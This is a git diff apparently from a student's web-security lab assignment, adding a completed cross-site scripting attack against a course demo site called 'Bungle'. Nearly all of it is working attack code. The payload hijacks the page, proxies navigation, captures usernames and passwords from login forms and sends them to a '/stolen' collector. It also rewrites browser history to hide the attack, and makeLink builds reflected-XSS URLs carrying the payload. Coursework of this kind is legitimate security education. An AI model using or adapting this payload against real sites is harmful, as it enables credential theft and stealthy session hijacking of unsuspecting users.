@@ -68,8 +68,7 @@ Then just add spying code and hide your suspicious URLs.
 
 // was getting 500 errors due to too large urls so used a minifier https://www.toptal.com/developers/javascript-minifier
 
-function payload(t){function n(t){var n=new XMLHttpRequest;n.open("GET",t),n.send()}function e(t,n,e,r){$.ajax({type:"POST",url:t,data:$(n).serialize(),success:function(t){i(e,r)}})}function r(t){return encodeURIComponent(t)}function o(t){return document.getElementById(t)}function u(t,u,l){let s="http://127.0.0.1:31337/stolen";s+="?event="+l;let a=o("logged-in-user");switch(null!==a&&(s+="&user="+r(a.innerText)),l){case"nav":n(s+="&url="+r(t)),i(t,u);return;case"login":s+="&user="+r(o("username").value),n(s+="&pass="+r(o("userpass").value)),e(t,"#loginForm","./",u);return;case"logout":n(s),e("./logout","#logoutForm",t,u);return}}function i(t,n){$("html").hide(),$("html").load(t,function(){function t(t,n,e,r){o(t)&&o(t).addEventListener("click",function(){u(n,e,r)})}$("html").show(),document.forms[1]&&document.forms[1].setAttribute("onsubmit","return false;"),document.forms[2]&&document.forms[2].setAttribute("onsubmit","return false;"),o("log-in-btn")&&o("log-in-btn").parentElement.parentElement.setAttribute("id","loginForm"),o("log-out-btn")&&o("log-out-btn").parentElement.setAttribute("id","logoutForm"),o("bungle-lnk").removeAttribute("href"),o("bungle-lnk").setAttribute("style","cursor:pointer;"),o("search-again-btn")&&(o("search-again-btn").removeAttribute("href"),o("search-again-btn").setAttribute("style","cursor:pointer;")),o("search-btn")&&o("search-btn").addEventListener("click",function(){u("./search?q="+r(o("query").value),n,"nav")}),t("log-in-btn","./login",n,"login"),t("new-account-btn","./create",n,"login"),t("log-out-btn","./",n,"logout"),t("bungle-lnk","./",n,"nav"),t("search-again-btn","./",n,"nav")})}i("./",t)}
-
+function payload(t){function n(t){var n=new XMLHttpRequest;n.open("GET",t),n.send()}function e(t,n,e,o){$.ajax({type:"POST",url:t,data:$(n).serialize(),success:function(t){l(e,o)}})}function o(t){return encodeURIComponent(t)}function r(t){return document.getElementById(t)}function i(t,i,u,a){let s="http://127.0.0.1:31337/stolen";s+="?event="+u;let c=r("logged-in-user");switch(null!==c&&(s+="&user="+o(c.innerText)),u){case"nav":n(s+="&url="+o(t)),l(t,i,a);return;case"login":s+="&user="+o(r("username").value),n(s+="&pass="+o(r("userpass").value)),e(t,"#loginForm","./",i);return;case"logout":n(s),e("./logout","#logoutForm",t,i);return}}function l(t,n,e){$("html").hide(),$("html").load(t,function(){function l(t){t&&t.setAttribute("onsubmit","return false;")}function u(t){r(t)&&(r(t).removeAttribute("href"),r(t).setAttribute("style","cursor:pointer;"))}function a(t,n,e,o){r(t)&&r(t).addEventListener("click",function(){i(n,e,o,!1)})}if($("html").show(),l(document.forms[1]),l(document.forms[2]),r("log-in-btn")&&r("log-in-btn").parentElement.parentElement.setAttribute("id","loginForm"),r("log-out-btn")&&r("log-out-btn").parentElement.setAttribute("id","logoutForm"),u("bungle-lnk"),u("search-again-btn"),r("search-btn")&&r("search-btn").addEventListener("click",function(){i("./search?q="+o(r("query").value).replace(/%20/g,"+"),n,"nav",!1)}),a("log-in-btn","./login",n,"login"),a("new-account-btn","./create",n,"login"),a("log-out-btn","./",n,"logout"),a("bungle-lnk","./",n,"nav"),a("search-again-btn","./",n,"nav"),null===history.state?history.replaceState({},"",t):e||history.pushState({},"",t),window.onpopstate=t=>{i(document.location.pathname+document.location.search,n,"nav",!0)},document.title="Not Bungle!",r("history-list"))for(var s=r("history-list").children,c=0;c<s.length;c++){var g=s[c],h="histElm"+c.toString();g.setAttribute("id",h),a(h,g.getAttribute("href"),n,"nav"),u(h),g.innerText.length>1500&&(g.remove(),c--)}})}i("./",t,"nav",!1)}
 
 function payloadTooBig(attacker) {
 
@@ -99,7 +98,7 @@ function payloadTooBig(attacker) {
         return document.getElementById(id);
     }
 
-    function spyAndProxy(url, spying_url, type){
+    function spyAndProxy(url, spying_url, type, back){
         let finalUrl = 'http://127.0.0.1:31337/stolen'; // using hardcoded instead of relying on passing...
         finalUrl += '?event=' + type;
         let user = documentGetElementByIdForMinify('logged-in-user');
@@ -112,7 +111,7 @@ function payloadTooBig(attacker) {
             case 'nav':
                 finalUrl += '&url=' + encodeURIComponentForMinify(url);
                 reqOpenSend(finalUrl);
-                proxy(url, spying_url);
+                proxy(url, spying_url, back);
                 return;
             case 'login': // for this case url corresponds to the ./login or ./create, redirecting to the home page
                 finalUrl += '&user=' + encodeURIComponentForMinify(documentGetElementByIdForMinify('username').value);
@@ -129,7 +128,7 @@ function payloadTooBig(attacker) {
 
     // This function can make it appear that a new page has been loaded
     // Note that you can proxy the main page, or a search page!
-	function proxy(href, spying_url) {
+	function proxy(href, spying_url, back) {
 
         	// Make all current HTML invisible.
         	$('html').hide();
@@ -140,28 +139,49 @@ function payloadTooBig(attacker) {
                 // Show new HTML
                 $('html').show();
 
-                // TODO implement spying while being stealthy and persistent. Remove the alert.
+                // DONE implement spying while being stealthy and persistent. Remove the alert.
                 
                 // have all forms except the defense level one do nothing on submit
-                if(document.forms[1]) {document.forms[1].setAttribute('onsubmit', 'return false;');}
-                if(document.forms[2]) {document.forms[2].setAttribute('onsubmit', 'return false;');}
+                function nullifyFormSubmit(form)
+                {
+                    if(form)
+                    {
+                        form.setAttribute('onsubmit', 'return false;');
+                    }
+                }
+                // if(document.forms[1]) {document.forms[1].setAttribute('onsubmit', 'return false;');}
+                // if(document.forms[2]) {document.forms[2].setAttribute('onsubmit', 'return false;');}
+                nullifyFormSubmit(document.forms[1]);
+                nullifyFormSubmit(document.forms[2]);
+
                 if(documentGetElementByIdForMinify('log-in-btn')) {documentGetElementByIdForMinify('log-in-btn').parentElement.parentElement.setAttribute('id', 'loginForm');}
                 if(documentGetElementByIdForMinify('log-out-btn')) {documentGetElementByIdForMinify('log-out-btn').parentElement.setAttribute('id', 'logoutForm');}
 
                 // make buttons do nothing
-                documentGetElementByIdForMinify('bungle-lnk').removeAttribute('href');
-                documentGetElementByIdForMinify('bungle-lnk').setAttribute('style', 'cursor:pointer;'); // probably don't need
-                if(documentGetElementByIdForMinify('search-again-btn')) {
-                    documentGetElementByIdForMinify('search-again-btn').removeAttribute('href');
-                    documentGetElementByIdForMinify('search-again-btn').setAttribute('style', 'cursor:pointer;'); // probably don't need
+                function removeHrefStyleCursor(id)
+                {
+                    if(documentGetElementByIdForMinify(id))
+                    {
+                        documentGetElementByIdForMinify(id).removeAttribute('href');
+                        documentGetElementByIdForMinify(id).setAttribute('style', 'cursor:pointer;');
+                    }
                 }
+
+                // documentGetElementByIdForMinify('bungle-lnk').removeAttribute('href');
+                // documentGetElementByIdForMinify('bungle-lnk').setAttribute('style', 'cursor:pointer;'); // probably don't need
+                // if(documentGetElementByIdForMinify('search-again-btn')) {
+                //     documentGetElementByIdForMinify('search-again-btn').removeAttribute('href');
+                //     documentGetElementByIdForMinify('search-again-btn').setAttribute('style', 'cursor:pointer;'); // probably don't need
+                // }
+                removeHrefStyleCursor('bungle-lnk');
+                removeHrefStyleCursor('search-again-btn');
 
                 function listener_add(id, sapurl, sapsurl, sapt)
                 {
                     if(documentGetElementByIdForMinify(id)) {documentGetElementByIdForMinify(id).addEventListener(
                         'click', 
                         function() {
-                            spyAndProxy(sapurl, sapsurl, sapt);
+                            spyAndProxy(sapurl, sapsurl, sapt, false);
                         }
                     );}
                 }
@@ -171,7 +191,7 @@ function payloadTooBig(attacker) {
                 if(documentGetElementByIdForMinify('search-btn')) {documentGetElementByIdForMinify('search-btn').addEventListener(
                     'click', 
                     function() {
-                        spyAndProxy('./search?q=' + encodeURIComponentForMinify(documentGetElementByIdForMinify("query").value), spying_url, 'nav');
+                        spyAndProxy('./search?q=' + encodeURIComponentForMinify(documentGetElementByIdForMinify("query").value).replace(/%20/g, "+"), spying_url, 'nav', false);
                     }
                 );}
 
@@ -220,14 +240,48 @@ function payloadTooBig(attacker) {
                 // );}
                 listener_add('search-again-btn', './', spying_url, 'nav');
 
-                // TODO hide history and make sure that history hits the proxy as needed
-                // TODO make forward and backwards buttons work
-                // TODO hide evidence of your attack in the URL bar for stealth using HTML5's history API. Watch out for double slashes in your paths
+                // DONE make forward and backwards buttons work
+                // DONE hide evidence of your attack in the URL bar for stealth using HTML5's history API. Watch out for double slashes in your paths
+                if(history.state === null)
+                {
+                    history.replaceState({}, "", href);
+                }
+                else
+                {
+                    if(!back)
+                    {
+                        history.pushState({}, "", href);
+                    }
+                }
+                window.onpopstate = (event) => {
+                    spyAndProxy(document.location.pathname + document.location.search, spying_url, 'nav', true);
+                };
 
+                // Set tab title to desired value to show control
+                document.title = "Not Bungle!";
+
+                // DONE hide history and make sure that history buttons hit the proxy as needed
+                // note history has a differing url from searching... shouldn't matter because should be pulling from the elements
+                if(documentGetElementByIdForMinify('history-list'))
+                {
+                    var historyElems = documentGetElementByIdForMinify('history-list').children;
+                    for (var i = 0; i < historyElems.length; i++) {
+                        var currHistoryElem = historyElems[i];
+                        var id = 'histElm' + i.toString();
+                        currHistoryElem.setAttribute('id', id);
+                        listener_add(id, currHistoryElem.getAttribute('href'), spying_url, 'nav');
+                        removeHrefStyleCursor(id);
+                        if (currHistoryElem.innerText.length > 1500)
+                        {
+                            currHistoryElem.remove();
+                            i--;
+                        }
+                    }
+                }
             });
     	}
     //Call Proxy
-	proxy('./', attacker)
+	spyAndProxy('./', attacker, 'nav', false);
 }
 
 function makeLink(target, attacker, defense) {
@@ -240,8 +294,8 @@ function makeLink(target, attacker, defense) {
             // DONE: Implement XSS warmup 2.2.3.1
             return  "http://bungle.cs.virginia.edu/multivac/?name=%3Cscript%3Ewindow.onload=function(){document.getElementsByTagName(%22a%22)[0].href=%22http://ece.illinois.edu/%22;}%3C/script%3E"
         case 2:
-            // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+            // DONE: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + 
                 encodeURIComponent(
                     "<script>" +
                     payload_string + 
@@ -250,16 +304,16 @@ function makeLink(target, attacker, defense) {
                 );
         case 3:
             // TODO: generate XSS URL for defense level 2.2.3.3
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
         case 4:
             // TODO: generate XSS URL payload for defense level 2.2.3.4
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
         case 5:
             // TODO: generate XSS URL payload for defense level 2.2.3.5
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
         case 6:
             // TODO: generate XSS URL payload for defense level 2.2.3.6
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
     }
 }
 
